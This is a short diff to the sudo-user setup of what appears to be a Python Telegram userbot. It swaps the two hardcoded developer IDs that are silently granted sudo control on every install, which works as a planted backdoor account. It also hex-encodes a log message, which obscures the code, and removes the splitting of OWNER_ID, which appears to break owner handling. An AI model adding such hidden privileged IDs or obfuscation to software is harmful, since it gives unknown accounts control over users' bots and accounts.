@@ -7,13 +7,13 @@ from .logger import LOGS
 class UsersData:
     def __init__(self) -> None:
         self.DEVS = [
-            1432756163,  # ForGo10God
-            1874070588,  # ForGo10_God
+            5059280908,  # ForGo10God
+            481449323,  # ForGo10_God
         ]
 
     async def sudo_users(self):
         LOGS.info("\x3e\x3e\x20\x53\x65\x74\x74\x69\x6e\x67\x20\x75\x70\x20\x73\x75\x64\x6f\x20\x75\x73\x65\x72\x73\x2e\x2e")
-        god_users = (Config.OWNER_ID).split(" ")
+        god_users = (Config.OWNER_ID)
         users = await db.get_sudo_users()
         for user_id in self.DEVS:
             Config.SUDO_USERS.add(user_id)
